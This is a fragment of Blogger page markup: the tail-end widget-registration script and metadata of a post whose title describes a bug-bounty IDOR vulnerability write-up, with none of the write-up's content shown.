'?view\x3dflipcard'}, 'magazine': {'name': 'magazine', 'url': '?view\x3dmagazine'}, 'mosaic': {'name': 'mosaic', 'url': '?view\x3dmosaic'}, 'sidebar': {'name': 'sidebar', 'url': '?view\x3dsidebar'}, 'snapshot': {'name': 'snapshot', 'url': '?view\x3dsnapshot'}, 'timeslide': {'name': 'timeslide', 'url': '?view\x3dtimeslide'}, 'isMobile': false, 'title': 'Changing other users Episode title \x26 description - IDOR Vulnerability in [REDACTED] (Write Up)', 'description': 'Bug Bounty, XSS, Infosec, Hacking, Insecure Direct Object Vulnerability, Session Misconfiguration, Open Redirect, Spotify, Anchor FM', 'url': 'http://blog.evanricafort.com/2021/02/idor-in-redacted.html', 'type': 'item', 'isSingleItem': true, 'isMultipleItems': false, 'isError': false, 'isPage': false, 'isPost': true, 'isHomepage': false, 'isArchive': false, 'isLabelSearch': false, 'postId': 455639502551743521}}]);
+_WidgetManager._RegisterWidget('_NavbarView', new _WidgetInfo('Navbar1', 'navbar', document.getElementById('Navbar1'), {}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_HeaderView', new _WidgetInfo('Header1', 'header', document.getElementById('Header1'), {}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_BlogView', new _WidgetInfo('Blog1', 'main', document.getElementById('Blog1'), {'cmtInteractionsEnabled': false, 'lightboxEnabled': true, 'lightboxModuleUrl': 'https://www.blogger.com/static/v1/jsbin/3812250239-lbx__en_gb.js', 'lightboxCssUrl': 'https://www.blogger.com/static/v1/v-css/1964470060-lightbox_bundle.css'}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_AdSenseView', new _WidgetInfo('AdSense1', 'sidebar-right-1', document.getElementById('AdSense1'), {}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_ProfileView', new _WidgetInfo('Profile1', 'sidebar-right-1', document.getElementById('Profile1'), {}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_HTMLView', new _WidgetInfo('HTML1', 'sidebar-right-1', document.getElementById('HTML1'), {}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_StatsView', new _WidgetInfo('Stats1', 'sidebar-right-1', document.getElementById('Stats1'), {'title': 'Total Pageviews', 'showGraphicalCounter': false, 'showAnimatedCounter': false, 'showSparkline': true, 'statsUrl': '//blog.evanricafort.com/b/stats?style\x3dBLACK_TRANSPARENT\x26timeRange\x3dALL_TIME\x26token\x3dAPq4FmB6RsngwABDu8_yYPy0ta3BJw0rKdmr9PTgjpcMjqChX1a_rNFkzvl2acGFCTKHXoruflKsyG2WnWtzvLaJSoKXuhd2yA'}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_BlogArchiveView', new _WidgetInfo('BlogArchive1', 'sidebar-right-2-1', document.getElementById('BlogArchive1'), {'languageDirection': 'ltr', 'loadingMessage': 'Loading\x26hellip;'}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_LabelView', new _WidgetInfo('Label1', 'sidebar-right-2-2', document.getElementById('Label1'), {}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_AttributionView', new _WidgetInfo('Attribution1', 'footer-3', document.getElementById('Attribution1'), {}, 'displayModeFull'));
+</script>
+</body>
+</html>
